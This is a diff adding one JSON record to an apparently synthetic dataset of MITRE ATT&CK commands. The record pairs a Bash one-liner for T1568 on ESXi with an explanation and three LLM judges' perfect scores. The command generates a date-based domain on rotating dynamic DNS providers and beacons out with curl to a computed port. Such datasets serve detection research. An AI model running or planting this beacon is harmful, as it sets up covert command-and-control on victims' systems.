@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "s=$(date -u +%G%V%u); sub=$(echo -n \"$s\" | md5sum | cut -c1-14); providers=(hopto.org sytes.net zapto.org ddns.net); dom=\"$sub.${providers[$(($(date -u +%u)%${#providers[@]}))]}\"; port=$(( 49152 + ($(date -u +%M) * 13 % 16383) )); curl --connect-timeout 6 \"https://$dom:$port/check\"",
+  "explanation": "Uses ISO week/day to drive a DGA label and rotates among different dynamic DNS providers with a computed high-ephemeral port. This leverages dynamic DNS resolution per T1568.",
+  "rationale_steps": [
+    "Build a weekly seed and hash to generate the subdomain.",
+    "Rotate provider domain based on day of week.",
+    "Choose a high ephemeral port from a formula.",
+    "Connect via curl to the dynamic domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-3af16eca",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignments, valid array usage, arithmetic operations, and command substitutions that will parse correctly in Bash.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by creating a deterministic but changing domain generation algorithm based on date components, rotating between dynamic DNS providers, calculating a dynamic high port, and attempting to establish command and control through HTTPS.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:36:12.968569Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command substitutions, arithmetic expansions, array usage, and proper command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a DGA for domain and port generation, rotates dynamic DNS providers, and performs a beaconing attempt, perfectly aligning with T1568's description of dynamic resolution and endpoint rotation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:36:22.050720Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Bash command is well-formed with balanced quotes/parentheses, correct array and arithmetic expansions, proper separators, and valid flags.",
+        "semantic_score": 5,
+        "semantic_justification": "It algorithmically generates a subdomain, rotates among dynamic DNS providers and ephemeral ports, then beacons via curl, demonstrating T1568 dynamic resolution (assuming curl/md5sum are available).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:37:01.072491Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
